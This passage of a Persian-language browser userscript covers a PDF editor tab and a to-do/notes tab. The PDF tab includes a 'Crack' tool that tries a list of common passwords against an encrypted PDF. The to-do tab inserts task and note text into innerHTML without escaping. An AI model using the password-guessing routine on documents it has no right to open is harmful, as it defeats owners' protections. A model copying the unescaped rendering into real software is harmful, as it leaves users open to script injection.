                        const buf=await f.arrayBuffer();_pRaw=new Uint8Array(buf);
                        await loadPdfjs();await _pLoadPdf(_pRaw);
                    });
                    // URL load
                    g('pde-url-go')&&g('pde-url-go').addEventListener('click',async()=>{
                        const url=(g('pde-url')?.value||'').trim();if(!url)return;
                        const st=D.getElementById('pde-stxt');if(st)st.textContent='⏳ Fetching...';
                        try{const r=await fetch(url);const buf=await r.arrayBuffer();_pRaw=new Uint8Array(buf);await loadPdfjs();await _pLoadPdf(_pRaw);}
                        catch(e){if(st)st.textContent='❌ '+e.message;}
                    });
                    // Drop zone
                    const dz=g('pde-dz');
                    if(dz){
                        dz.addEventListener('click',openFn);
                        dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('drag');});
                        dz.addEventListener('dragleave',()=>dz.classList.remove('drag'));
                        dz.addEventListener('drop',async e=>{e.preventDefault();dz.classList.remove('drag');const f=e.dataTransfer.files[0];if(f&&f.type==='application/pdf'){const b=await f.arrayBuffer();_pRaw=new Uint8Array(b);await loadPdfjs();await _pLoadPdf(_pRaw);}});
                    }
                    const wrap=g('pde-wrap');
                    if(wrap&&_pDoc){
                        wrap.addEventListener('dragover',e=>e.preventDefault());
                        wrap.addEventListener('drop',async e=>{e.preventDefault();const f=e.dataTransfer.files[0];if(f&&f.type==='application/pdf'){const b=await f.arrayBuffer();_pRaw=new Uint8Array(b);await loadPdfjs();await _pLoadPdf(_pRaw);}});
                    }
                    // Save / Download
                    g('pde-save')&&g('pde-save').addEventListener('click',async()=>{const b64=await _pSaveKernel();if(b64)_pDL(b64,'edited.pdf');});
                    g('pde-dl')&&g('pde-dl').addEventListener('click',()=>{if(!_pRaw){alert(_('No PDF loaded'));return;}const b64=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));_pDL(b64,'original.pdf');});
                    // Tools
                    content.querySelectorAll('[data-pt]').forEach(btn=>btn.addEventListener('click',()=>{
                        _pTool=btn.dataset.pt;
                        content.querySelectorAll('[data-pt]').forEach(b=>b.classList.toggle('on',b.dataset.pt===_pTool));
                        const tv=g('pde-tv');if(tv)tv.style.display=_pTool==='text'?'block':'none';
                        const aC=g('pde-ann-c');if(aC)aC.style.cursor={select:'default',text:'text',erase:'cell'}[_pTool]||'crosshair';
                    }));
                    g('pde-undo')&&g('pde-undo').addEventListener('click',()=>{_pUn(_pPage);_pDraw2();});
                    g('pde-clrpg')&&g('pde-clrpg').addEventListener('click',()=>{if(confirm(_('Clear Page')+'?')){_pSn(_pPage);_pAnns[_pPage]=[];_pDraw2();}});
                    g('pde-col')&&g('pde-col').addEventListener('input',function(){_pColor=this.value;});
                    g('pde-sz')&&g('pde-sz').addEventListener('input',function(){_pSize=parseInt(this.value)||3;});
                    // Navigation
                    g('pde-prev')&&g('pde-prev').addEventListener('click',()=>{if(_pDoc&&_pPage>1)_pRender(_pPage-1);});
                    g('pde-next')&&g('pde-next').addEventListener('click',()=>{if(_pDoc&&_pPage<_pDoc.numPages)_pRender(_pPage+1);});
                    g('pde-zi')&&g('pde-zi').addEventListener('click',()=>{_pScale=Math.min(_pScale+0.2,4);g('pde-zl').textContent=Math.round(_pScale*100)+'%';_pRender(_pPage);});
                    g('pde-zo')&&g('pde-zo').addEventListener('click',()=>{_pScale=Math.max(_pScale-0.2,0.3);g('pde-zl').textContent=Math.round(_pScale*100)+'%';_pRender(_pPage);});
                    // Canvas events
                    const aC=g('pde-ann-c');
                    if(aC){
                        const gp=e=>{const r=aC.getBoundingClientRect();return{x:e.clientX-r.left,y:e.clientY-r.top};};
                        aC.addEventListener('mousedown',e=>{
                            if(_pTool==='select')return;
                            _pDraw=true;const{x,y}=gp(e);_pSn(_pPage);
                            if(_pTool==='draw'){_pPts=[{x,y}];}
                            else if(_pTool==='text'){
                                const tv=g('pde-tv');const txt=tv?.value||prompt('متن:','');
                                if(txt){_pA(_pPage).push({t:'text',x,y,v:txt,c:_pColor,s:_pSize||13,op:1});}
                                _pDraw=false;_pDraw2();return;
                            }
                            else{_pDrag={x,y};}
                        });
                        aC.addEventListener('mousemove',e=>{
                            if(!_pDraw)return;const{x,y}=gp(e);
                            if(_pTool==='draw'){
                                _pPts.push({x,y});const ctx=aC.getContext('2d');const n=_pPts.length;
                                if(n>1){ctx.strokeStyle=_pColor;ctx.lineWidth=_pSize;ctx.lineCap='round';ctx.beginPath();ctx.moveTo(_pPts[n-2].x,_pPts[n-2].y);ctx.lineTo(x,y);ctx.stroke();}
                            }else if(_pTool==='erase'){
                                const sz=_pSize*3;const ctx=aC.getContext('2d');ctx.clearRect(x-sz/2,y-sz/2,sz,sz);
                                _pAnns[_pPage]=(_pAnns[_pPage]||[]).filter(a=>{
                                    if(a.t==='draw')return !a.pts.some(p=>Math.hypot(p.x-x,p.y-y)<sz);
                                    return Math.hypot((a.x||0)-x,(a.y||0)-y)>sz;
                                });
                            }else if(_pDrag){
                                _pDraw2();const ctx=aC.getContext('2d');const{x:sx,y:sy}=_pDrag;
                                if(_pTool==='highlight'){ctx.globalAlpha=0.35;ctx.fillStyle=_pColor;ctx.fillRect(sx,sy,x-sx,y-sy);ctx.globalAlpha=1;}
                                else if(_pTool==='shape'){ctx.strokeStyle=_pColor;ctx.lineWidth=_pSize;ctx.strokeRect(sx,sy,x-sx,y-sy);}
                            }
                        });
                        const endFn=e=>{
                            if(!_pDraw)return;_pDraw=false;const{x,y}=gp(e);
                            if(_pTool==='draw'&&_pPts.length>1){_pA(_pPage).push({t:'draw',pts:[..._pPts],c:_pColor,s:_pSize,op:1});}
                            else if(_pDrag&&(_pTool==='highlight'||_pTool==='shape')){const{x:sx,y:sy}=_pDrag;_pA(_pPage).push({t:_pTool,x:sx,y:sy,w:x-sx,h:y-sy,c:_pColor,s:_pSize,op:1});}
                            _pPts=[];_pDrag=null;_pDraw2();
                        };
                        aC.addEventListener('mouseup',endFn);aC.addEventListener('mouseleave',endFn);
                    }
                    // Extract text
                    g('pde-extract')&&g('pde-extract').addEventListener('click',async()=>{
                        if(!_pDoc||!_pRaw){alert(_('No PDF loaded'));return;}
                        const tp=g('pde-txt-panel');if(tp)tp.style.display='block';
                        const tc=g('pde-txt-c');if(tc)tc.textContent='⏳...';
                        if(_kernelOnline&&S.kernelUrl){
                            try{const b64=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));
                            const r=await fetch(S.kernelUrl+'/pdf/extract-text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pdfData:b64})});
                            if(r.ok){const d=await r.json();if(tc)tc.textContent=d.pages.map(p=>`=== Page ${p.page+1} ===\n${p.text}`).join('\n\n');return;}}catch(e){}
                        }
                        let text='';for(let i=1;i<=_pDoc.numPages;i++){const pg=await _pDoc.getPage(i);const tc2=await pg.getTextContent();text+=`=== Page ${i} ===\n${tc2.items.map(it=>it.str).join(' ')}\n\n`;}
                        if(tc)tc.textContent=text;
                    });
                    g('pde-txt-cp')&&g('pde-txt-cp').addEventListener('click',()=>{const tc=g('pde-txt-c');if(tc)N.clipboard&&N.clipboard.writeText(tc.textContent);});
                    g('pde-txt-cl')&&g('pde-txt-cl').addEventListener('click',()=>{const tp=g('pde-txt-panel');if(tp)tp.style.display='none';});
                    // Rotate
                    g('pde-rot-btn')&&g('pde-rot-btn').addEventListener('click',async()=>{
                        if(!_pDoc||!_pRaw){alert(_('No PDF loaded'));return;}
                        if(!_kernelOnline||!S.kernelUrl){alert('Kernel required');return;}
                        const b64=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));
                        try{const r=await fetch(S.kernelUrl+'/pdf/rotate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pdfData:b64,page:_pPage-1,degrees:90})});
                        if(r.ok){const d=await r.json();const by=atob(d.pdfData),arr=new Uint8Array(by.length);for(let i=0;i<by.length;i++)arr[i]=by.charCodeAt(i);_pRaw=arr;await _pLoadPdf(_pRaw);}}catch(e){alert('❌ '+e.message);}
                    });
                    // Compress
                    g('pde-cmp-btn')&&g('pde-cmp-btn').addEventListener('click',async()=>{
                        if(!_pDoc||!_pRaw){alert(_('No PDF loaded'));return;}
                        if(!_kernelOnline||!S.kernelUrl){alert('Kernel required');return;}
                        const stxt=D.getElementById('pde-stxt');if(stxt)stxt.textContent='⏳ Compressing...';
                        const b64=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));
                        try{const r=await fetch(S.kernelUrl+'/pdf/compress',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pdfData:b64})});
                        if(r.ok){const d=await r.json();_pDL(d.pdfData,'compressed.pdf');if(stxt)stxt.textContent='✅ Compressed';}}catch(e){if(stxt)stxt.textContent='❌ '+e.message;}
                    });
                    // Merge
                    g('pde-merge-btn')&&g('pde-merge-btn').addEventListener('click',()=>{const p=g('pde-merge-panel');if(p)p.style.display=p.style.display==='none'?'block':'none';});
                    g('pde-mcl')&&g('pde-mcl').addEventListener('click',()=>{const p=g('pde-merge-panel');if(p)p.style.display='none';});
                    g('pde-mdo')&&g('pde-mdo').addEventListener('click',async()=>{
                        const f=g('pde-mf')?.files[0];if(!f){alert('Select a PDF');return;}
                        if(!_pRaw){alert(_('No PDF loaded'));return;}
                        if(!_kernelOnline||!S.kernelUrl){alert('Kernel required');return;}
                        const b64_1=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));
                        const buf2=await f.arrayBuffer();const b64_2=btoa(String.fromCharCode(...new Uint8Array(new Uint8Array(buf2))));
                        try{const r=await fetch(S.kernelUrl+'/pdf/merge',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pdfs:[b64_1,b64_2]})});
                        if(r.ok){const d=await r.json();_pDL(d.pdfData,'merged.pdf');const p2=g('pde-merge-panel');if(p2)p2.style.display='none';}}catch(e){alert('❌ '+e.message);}
                    });
                    // Split
                    g('pde-split-btn')&&g('pde-split-btn').addEventListener('click',async()=>{
                        if(!_pDoc||!_pRaw){alert(_('No PDF loaded'));return;}
                        if(!_kernelOnline||!S.kernelUrl){alert('Kernel required');return;}
                        const at=parseInt(prompt('Split after which page? (1-'+((_pDoc.numPages-1)||1)+')',String(Math.ceil(_pDoc.numPages/2))));if(!at)return;
                        const b64=btoa(String.fromCharCode(...new Uint8Array(_pRaw)));
                        try{const r=await fetch(S.kernelUrl+'/pdf/split',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pdfData:b64,splitAt:at})});
                        if(r.ok){const d=await r.json();d.parts.forEach((p,i)=>_pDL(p,'part'+(i+1)+'.pdf'));}}catch(e){alert('❌ '+e.message);}
                    });
                    // Crack
                    g('pde-crack-btn')&&g('pde-crack-btn').addEventListener('click',()=>{const p=g('pde-crack-panel');if(p)p.style.display=p.style.display==='none'?'block':'none';});
                    const tryCrack=async pw=>{
                        const st=g('pde-crack-st');if(st)st.textContent='⏳ '+pw;
                        try{await pdfjsLib.getDocument({data:_pRaw,password:pw}).promise;if(st)st.innerHTML='✅ رمز: <b style="color:#007acc;font-size:14px;">'+pw+'</b>';return true;}catch(e){return false;}
                    };
                    g('pde-crack-common')&&g('pde-crack-common').addEventListener('click',async()=>{
                        await loadPdfjs();const st=g('pde-crack-st');if(st)st.textContent='⏳...';
                        for(const pw of COMMON_PW){if(await tryCrack(pw))return;}
                        if(st)st.textContent='❌ Not found.';
                    });
                    g('pde-crack-try')&&g('pde-crack-try').addEventListener('click',async()=>{
                        const pw=g('pde-crack-inp')?.value||'';if(!pw)return;
                        await loadPdfjs();if(await tryCrack(pw)&&_pRaw)await _pLoadPdf(_pRaw,pw);
                    });
                    // Keyboard
                    const _kpde=e=>{
                        if(!D.getElementById('pde-ann-c'))return;
                        if(e.ctrlKey&&(e.key==='z'||e.key==='Z')){e.preventDefault();_pUn(_pPage);_pDraw2();}
                        if(!e.ctrlKey&&e.key==='ArrowRight'&&_pDoc&&_pPage<_pDoc.numPages)_pRender(_pPage+1);
                        if(!e.ctrlKey&&e.key==='ArrowLeft'&&_pDoc&&_pPage>1)_pRender(_pPage-1);
                    };
                    D.removeEventListener('keydown',D._pdeKey,false);
                    D._pdeKey=_kpde;
                    D.addEventListener('keydown',_kpde,false);
                }

                // loadPdfjs then build (no await here - showTab is not async)
                loadPdfjs().then(() => _pBuild()).catch(() => _pBuild());
            }
            // ---- Todo (redesigned) ----
            else if (tab === 'Todo') {
                // CSS injection
                if(!D.getElementById('bi-todo-css')){
                    const ts=D.createElement('style'); ts.id='bi-todo-css';
                    ts.textContent=`
                        .bi-tn{display:flex;flex-direction:column;height:100%;direction:rtl;}
                        .bi-tn-tabs{display:flex;gap:5px;padding:0 0 8px;flex-shrink:0;}
                        .bi-tntab{flex:1;padding:8px;border-radius:8px;border:none;cursor:pointer;font-size:12px;font-weight:700;font-family:inherit;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:4px;}
                        .bi-tntab.nt{background:#1f1900;color:#b87e00;} .bi-tntab.nt.on{background:#c5862c;color:#fff;}
                        .bi-tntab.tt{background:#0d1f36;color:#4a90d9;} .bi-tntab.tt.on{background:#0e639c;color:#fff;}
                        .bi-tnbar{display:flex;align-items:center;gap:4px;padding:0 0 6px;flex-shrink:0;}
                        .bi-tnico{width:28px;height:28px;border-radius:6px;border:none;background:#3c3c3c;color:#888;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:13px;transition:.15s;font-family:inherit;}
                        .bi-tnico:hover{background:#4d4d4d;color:#d4d4d4;} .bi-tnico.on{background:#1a3050;color:#007acc;}
                        .bi-tnsrch{flex:1;background:#3c3c3c;border:1px solid #555;border-radius:6px;color:#d4d4d4;padding:5px 9px;font-size:11px;outline:none;direction:rtl;font-family:inherit;}
                        .bi-tnbody{flex:1;overflow-y:auto;}
                        .bi-tnbody::-webkit-scrollbar{width:3px;} .bi-tnbody::-webkit-scrollbar-thumb{background:#3e3e42;border-radius:3px;}
                        .bi-tnempty{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:24px 16px;text-align:center;}
                        .bi-tnempty-ico{font-size:44px;opacity:.3;} .bi-tnempty-ttl{font-size:14px;font-weight:700;color:#d4d4d4;}
                        .bi-tnempty-sug{font-size:11px;color:#c5862c;font-weight:600;}
                        .bi-tnempty ul{list-style:disc;padding-right:16px;text-align:right;margin:0;}
                        .bi-tnempty li{font-size:11px;color:#6a9955;margin:3px 0;cursor:pointer;transition:.1s;} .bi-tnempty li:hover{color:#d4d4d4;}
                        .bi-task{background:#252526;border:1px solid #3e3e42;border-radius:8px;padding:9px 11px;margin-bottom:6px;transition:.15s;}
                        .bi-task:hover{border-color:#007acc44;} .bi-task.done{opacity:.5;}
                        .bi-task-top{display:flex;align-items:flex-start;gap:8px;}
                        .bi-task-chk{width:18px;height:18px;border-radius:50%;border:2px solid #555;background:transparent;cursor:pointer;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:.2s;margin-top:1px;font-size:10px;font-family:inherit;}
                        .bi-task-chk:hover{border-color:#007acc;} .bi-task-chk.done{background:#238636;border-color:#238636;color:#fff;}
                        .bi-task-txt{flex:1;font-size:12px;color:#d4d4d4;line-height:1.5;word-break:break-word;}
                        .bi-task-txt.done{text-decoration:line-through;color:#6a9955;}
                        .bi-task-acts{display:flex;gap:3px;opacity:0;transition:.15s;} .bi-task:hover .bi-task-acts{opacity:1;}
                        .bi-task-ibtn{width:22px;height:22px;border-radius:5px;border:none;background:#3c3c3c;color:#888;cursor:pointer;font-size:11px;display:flex;align-items:center;justify-content:center;transition:.15s;font-family:inherit;}
                        .bi-task-ibtn:hover{background:#4d4d4d;color:#d4d4d4;} .bi-task-ibtn.rd:hover{background:#5a1a1a;color:#f44;}
                        .bi-task-meta{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap;align-items:center;}
                        .bi-pri{font-size:10px;padding:2px 7px;border-radius:20px;font-weight:700;}
                        .bi-pri.h{background:#5a1a1a;color:#f66;} .bi-pri.m{background:#4d3000;color:#d29922;} .bi-pri.l{background:#0a2d12;color:#3fb950;}
                        .bi-due{font-size:10px;color:#888;} .bi-due.late{color:#f66;}
                        .bi-note{background:#252526;border:1px solid #3e3e42;border-radius:8px;padding:9px 11px;margin-bottom:6px;transition:.15s;cursor:pointer;}
                        .bi-note:hover{border-color:#c5862c44;}
                        .bi-note-hd{display:flex;align-items:flex-start;justify-content:space-between;gap:6px;}
                        .bi-note-ttl{font-size:12px;color:#d4d4d4;font-weight:600;flex:1;} .bi-note-prev{font-size:11px;color:#888;line-height:1.5;margin-top:4px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;}
                        .bi-note-date{font-size:10px;color:#555;margin-top:5px;}
                        .bi-tnfooter{padding:6px 0 0;border-top:1px solid #3e3e42;flex-shrink:0;}
                        .bi-tn-inprow{display:flex;align-items:center;gap:6px;}
                        .bi-tn-inp{flex:1;background:#3c3c3c;border:1px solid #555;border-radius:8px;color:#d4d4d4;padding:7px 10px;font-size:12px;outline:none;direction:rtl;transition:.15s;font-family:inherit;}
                        .bi-tn-inp:focus{border-color:#007acc;} .bi-tn-inp.ni:focus{border-color:#c5862c;}
                        .bi-tn-addbtn{padding:7px 11px;border-radius:7px;border:none;cursor:pointer;font-size:11px;font-weight:700;white-space:nowrap;transition:.15s;font-family:inherit;}
                        .bi-tn-addbtn.ta{background:#0e639c;color:#fff;} .bi-tn-addbtn.ta:hover{background:#1177bb;}
                        .bi-tn-addbtn.na{background:#c5862c;color:#fff;} .bi-tn-addbtn.na:hover{background:#d4973d;}
                        .bi-tnpanel{background:#2d2d2d;border:1px solid #3e3e42;border-radius:8px;padding:10px;margin-bottom:6px;flex-shrink:0;}
                        .bi-tnchips{display:flex;gap:4px;flex-wrap:wrap;}
                        .bi-tnchip{padding:4px 10px;border-radius:20px;background:#3c3c3c;border:1px solid #555;color:#888;font-size:11px;cursor:pointer;transition:.15s;font-family:inherit;}
                        .bi-tnchip:hover{color:#d4d4d4;} .bi-tnchip.on{background:#1a3050;border-color:#007acc;color:#007acc;}
                        .bi-tnradio{display:flex;align-items:center;gap:6px;padding:4px 0;cursor:pointer;color:#c9c9c9;font-size:12px;}
                        .bi-tndanger{display:flex;align-items:center;gap:6px;padding:6px 7px;border-radius:6px;cursor:pointer;color:#f44;font-size:11px;transition:.15s;background:transparent;border:none;width:100%;text-align:right;font-family:inherit;}
                        .bi-tndanger:hover{background:#3d0c0c;}
                        .bi-xp{background:#2d2d2d;border:1px solid #3e3e42;border-radius:8px;padding:10px;margin-bottom:6px;}
                        .bi-xp textarea{width:100%;background:transparent;border:none;color:#d4d4d4;font-size:12px;resize:none;outline:none;direction:rtl;min-height:50px;font-family:Consolas,monospace;line-height:1.5;}
                        .bi-xpbtns{display:flex;gap:5px;flex-wrap:wrap;margin-top:7px;align-items:center;}
                        .bi-xpbtn{padding:3px 9px;border-radius:5px;background:#3c3c3c;border:1px solid #555;color:#888;font-size:11px;cursor:pointer;font-family:inherit;}
                        .bi-xpsub{padding:6px 14px;background:#0e639c;color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;margin-right:auto;font-family:inherit;}
                    `;
                    D.head.appendChild(ts);
                }
                let tnTab=GM_getValue('bi_tn_tab','tasks');
                let tnTasks=(()=>{try{return JSON.parse(GM_getValue('bi_tasks_v4','[]'));}catch(e){return [];}})();
                let tnNotes=(()=>{try{return JSON.parse(GM_getValue('bi_notes_v4','[]'));}catch(e){return [];}})();
                // migrate old todos
                if(!tnTasks.length && S.todos && S.todos.length){
                    tnTasks=S.todos.filter(t=>!t.isNote).map(t=>({id:(Date.now()+Math.random()).toString(36),title:t.text||'',done:t.done||false,pri:'',due:t.time||null,labels:[],created:t.created||Date.now()}));
                    GM_setValue('bi_tasks_v4',JSON.stringify(tnTasks));
                }
                let tnFilter={due:'',pri:''};
                let tnSort='created'; let tnShowDone=false;
                let tnShowFP=false,tnShowSP=false,tnShowMore=false,tnAdding=false,tnNoteQ='';
                const saveTnTasks=()=>GM_setValue('bi_tasks_v4',JSON.stringify(tnTasks));
                const saveTnNotes=()=>GM_setValue('bi_notes_v4',JSON.stringify(tnNotes));
                const tnuid=()=>Date.now().toString(36)+Math.random().toString(36).slice(2,6);
                const tnfmt=ts=>ts?new Date(ts).toLocaleDateString('fa-IR'):'';
                const tntoday=ts=>{const d=new Date(ts),n=new Date();return d.toDateString()===n.toDateString();};
                const tnpast=ts=>ts<Date.now();
                const tnhasF=()=>tnFilter.due||tnFilter.pri;

                function tnGetFiltered(){
                    let list=[...tnTasks];
                    if(!tnShowDone)list=list.filter(t=>!t.done);
                    if(tnFilter.due==='today')list=list.filter(t=>t.due&&tntoday(t.due));
                    else if(tnFilter.due==='past')list=list.filter(t=>t.due&&tnpast(t.due)&&!tntoday(t.due));
                    else if(tnFilter.due==='none')list=list.filter(t=>!t.due);
                    if(tnFilter.pri)list=list.filter(t=>t.pri===tnFilter.pri);
                    if(tnSort==='due')list.sort((a,b)=>(a.due||9e15)-(b.due||9e15));
                    else if(tnSort==='pri')list.sort((a,b)=>(({high:0,medium:1,low:2}[a.pri]??3))-({high:0,medium:1,low:2}[b.pri]??3));
                    else list.sort((a,b)=>b.created-a.created);
                    return list;
                }

                function tnRender(){
                    const filtered=tnTab==='tasks'?tnGetFiltered():tnNotes.filter(n=>!tnNoteQ||n.title.toLowerCase().includes(tnNoteQ));
                    content.innerHTML=`<div class="bi-tn">
                      <div class="bi-tn-tabs">
                        <button class="bi-tntab nt ${tnTab==='notes'?'on':''}" id="tn-n">📋 ${_('Notes')}</button>
                        <button class="bi-tntab tt ${tnTab==='tasks'?'on':''}" id="tn-t">☑️ ${_('Tasks')}</button>
                      </div>
                      <div class="bi-tnbar">
                        ${tnTab==='tasks'?`
                          <button class="bi-tnico ${tnShowMore?'on':''}" id="tn-more">···</button>
                          <button class="bi-tnico" id="tn-done-tog">${tnShowDone?'👁':'🚫'}</button>
                          <button class="bi-tnico ${tnShowFP?'on':''}" id="tn-fp">⚙</button>
                          <button class="bi-tnico ${tnShowSP?'on':''}" id="tn-sp">↕</button>
                          ${tnhasF()?'<span style="font-size:10px;padding:2px 7px;background:#1a3050;color:#007acc;border-radius:20px;">فیلتر</span>':''}
                        `:`
                          <button class="bi-tnico ${tnShowMore?'on':''}" id="tn-more-n">···</button>
                          <input class="bi-tnsrch" id="tn-srch" placeholder="جستجو..." value="${tnNoteQ}">
                        `}
                      </div>
                      ${tnTab==='tasks'&&tnShowSP?`<div class="bi-tnpanel"><div style="font-size:11px;color:#888;margin-bottom:6px;font-weight:600;">↕ ${_('Sort')}</div>
                        ${[['created','تاریخ ساخت'],['due',_('Due date')],['pri',_('Priority')]].map(([v,l])=>`<label class="bi-tnradio"><input type="radio" name="tn-sort" value="${v}" ${tnSort===v?'checked':''}> ${l}</label>`).join('')}
                      </div>`:''}
                      ${tnTab==='tasks'&&tnShowFP?`<div class="bi-tnpanel">
                        <div style="font-size:11px;color:#888;margin-bottom:5px;font-weight:600;">📅 ${_('Due date')}</div>
                        <div class="bi-tnchips">
                          ${[['today',_('Today')],['past','گذشته'],['none','بدون سررسید']].map(([v,l])=>`<button class="bi-tnchip ${tnFilter.due===v?'on':''}" data-fdue="${v}">${l}</button>`).join('')}
                        </div>
                        <div style="font-size:11px;color:#888;margin:7px 0 5px;font-weight:600;">🚩 ${_('Priority')}</div>
                        <div class="bi-tnchips">
                          ${[['high','🔴 '+_('High')],['medium','🟡 '+_('Medium')],['low','🟢 '+_('Low')],['','—']].map(([v,l])=>`<button class="bi-tnchip ${tnFilter.pri===v?'on':''}" data-fpri="${v}">${l}</button>`).join('')}
                        </div>
                        ${tnhasF()?`<button class="bi-tndanger" id="tn-clf" style="margin-top:7px;">🗑 پاک فیلتر</button>`:''}
                      </div>`:''}
                      ${tnTab==='tasks'&&tnShowMore?`<div class="bi-tnpanel">
                        <label style="display:flex;align-items:center;gap:7px;cursor:pointer;color:#c9c9c9;font-size:12px;padding:3px 0"><input type="checkbox" id="tn-donecb" ${tnShowDone?'checked':''} style="accent-color:#0e639c;width:auto;"> ${_('Show done')}</label>
                        <button class="bi-tndanger" id="tn-del-all">🗑 ${_('Delete all tasks')}</button>
                      </div>`:''}
                      ${tnTab==='notes'&&tnShowMore?`<div class="bi-tnpanel">
                        <button class="bi-tndanger" id="tn-del-all-n">🗑 ${_('Delete all notes')}</button>
                      </div>`:''}
                      ${tnTab==='tasks'&&tnAdding?`<div class="bi-xp">
                        <textarea id="tn-xp-ta" placeholder="عنوان تسک..." dir="rtl"></textarea>
                        <div class="bi-xpbtns">
                          <select id="tn-xp-pri" class="bi-xpbtn"><option value="">اولویت</option><option value="high">🔴 بالا</option><option value="medium">🟡 متوسط</option><option value="low">🟢 پایین</option></select>
                          <input type="date" id="tn-xp-due" class="bi-xpbtn">
                          <button class="bi-xpsub" id="tn-xp-sub">افزودن ✓</button>
                        </div>
                      </div>`:''}
                      <div class="bi-tnbody">${tnTab==='tasks'?tnRenderTasks(filtered):tnRenderNotes(filtered)}</div>
                      <div class="bi-tnfooter">
                        ${tnTab==='tasks'?`<div class="bi-tn-inprow"><input class="bi-tn-inp" id="tn-qi" placeholder="${_('Write a task...')}" dir="rtl"><button class="bi-tn-addbtn ta" id="tn-add-t">تسک ✓</button></div>`
                        :`<div class="bi-tn-inprow"><input class="bi-tn-inp ni" id="tn-ni" placeholder="${_('Write a note...')}" dir="rtl"><button class="bi-tn-addbtn na" id="tn-add-n">یادداشت 📋</button></div>`}
                      </div>
                    </div>`;
                    tnBind();
                }

                function tnRenderTasks(list){
                    if(!list.length){
                        const empty=!tnTasks.length||(!tnShowDone&&tnTasks.every(t=>t.done));
                        const ttl = empty ? _('No tasks yet!') : _('No tasks found');
                        const sug = empty ? ('<div class="bi-tnempty-sug">'+_('Suggestions:')+'</div><ul>'+
                            '<li data-tnqi="daily-tasks">'+_('Daily tasks')+'</li>'+
                            '<li data-tnqi="shopping-list">'+_('Shopping list')+'</li>'+
                            '<li data-tnqi="payment-reminder">'+_('Payment reminder')+'</li>'+
                            '</ul>') : '';
                        return '<div class="bi-tnempty"><div class="bi-tnempty-ico">☑️</div><div class="bi-tnempty-ttl">'+ttl+'</div>'+sug+'</div>';
                    }
                    const priMap={high:['h','🔴 '+_('High')],medium:['m','🟡 '+_('Medium')],low:['l','🟢 '+_('Low')]};
                    return list.map(t=>{
                        const late=t.due&&!t.done&&tnpast(t.due)&&!tntoday(t.due);
                        const [pc,pl]=priMap[t.pri]||[];
                        return '<div class="bi-task '+(t.done?'done':'')+'">'+
                            '<div class="bi-task-top">'+
                            '<button class="bi-task-chk '+(t.done?'done':'')+'" data-tntg="'+t.id+'">'+(t.done?'✓':'')+'</button>'+
                            '<div class="bi-task-txt '+(t.done?'done':'')+'">'+t.title+'</div>'+
                            '<div class="bi-task-acts"><button class="bi-task-ibtn rd" data-tntd="'+t.id+'">🗑</button></div>'+
                            '</div>'+
                            ((t.pri||t.due)?'<div class="bi-task-meta">'+
                                (pc?'<span class="bi-pri '+pc+'">'+pl+'</span>':'')+
                                (t.due?'<span class="bi-due '+(late?'late':'')+'">📅 '+tnfmt(t.due)+(late?' ('+_('Overdue')+')':'')+'</span>':'')+
                                '</div>':'')+
                            '</div>';
                    }).join('');
                }

                function tnRenderNotes(list){
                    if(!list.length){
                        const ttl = tnNoteQ ? _('No notes found') : _('No notes yet!');
                        const sug = !tnNoteQ ? ('<div class="bi-tnempty-sug">'+_('Suggestions:')+'</div><ul>'+
                            '<li data-tnni="daily-journal">'+_('Daily journal')+'</li>'+
                            '<li data-tnni="monthly-plan">'+_('Monthly plan')+'</li>'+
                            '<li data-tnni="goals-list">'+_('Goals list')+'</li>'+
                            '</ul>') : '';
                        return '<div class="bi-tnempty"><div class="bi-tnempty-ico">📋</div><div class="bi-tnempty-ttl">'+ttl+'</div>'+sug+'</div>';
                    }
                    return list.map(n=>(
                        '<div class="bi-note">'+
                        '<div class="bi-note-hd">'+
                        '<div class="bi-note-ttl">'+n.title+'</div>'+
                        '<button class="bi-task-ibtn rd" data-tnnd="'+n.id+'">🗑</button>'+
                        '</div>'+
                        (n.body?'<div class="bi-note-prev">'+n.body+'</div>':'')+
                        '<div class="bi-note-date">📅 '+tnfmt(n.created)+'</div>'+
                        '</div>'
                    )).join('');
                }

                function tnBind(){
                    const W2=content.querySelector('.bi-tn'); if(!W2)return;
                    const g=id=>W2.querySelector('#'+id);
                    const re=()=>tnRender();
                    // tabs
                    g('tn-n')&&g('tn-n').addEventListener('click',()=>{tnTab='notes';tnShowFP=tnShowSP=tnShowMore=false;GM_setValue('bi_tn_tab','notes');re();});
                    g('tn-t')&&g('tn-t').addEventListener('click',()=>{tnTab='tasks';tnShowFP=tnShowSP=tnShowMore=false;GM_setValue('bi_tn_tab','tasks');re();});
                    // toolbar
                    g('tn-fp')&&g('tn-fp').addEventListener('click',()=>{tnShowFP=!tnShowFP;tnShowSP=false;tnShowMore=false;re();});
                    g('tn-sp')&&g('tn-sp').addEventListener('click',()=>{tnShowSP=!tnShowSP;tnShowFP=false;tnShowMore=false;re();});
                    g('tn-more')&&g('tn-more').addEventListener('click',()=>{tnShowMore=!tnShowMore;tnShowFP=false;tnShowSP=false;re();});
                    g('tn-more-n')&&g('tn-more-n').addEventListener('click',()=>{tnShowMore=!tnShowMore;re();});
                    g('tn-done-tog')&&g('tn-done-tog').addEventListener('click',()=>{tnShowDone=!tnShowDone;re();});
                    g('tn-donecb')&&g('tn-donecb').addEventListener('change',function(){tnShowDone=this.checked;re();});
                    g('tn-srch')&&g('tn-srch').addEventListener('input',function(){tnNoteQ=this.value.toLowerCase();re();});
                    // sort
                    W2.querySelectorAll('input[name="tn-sort"]').forEach(r=>r.addEventListener('change',()=>{tnSort=r.value;re();}));
                    // filter chips
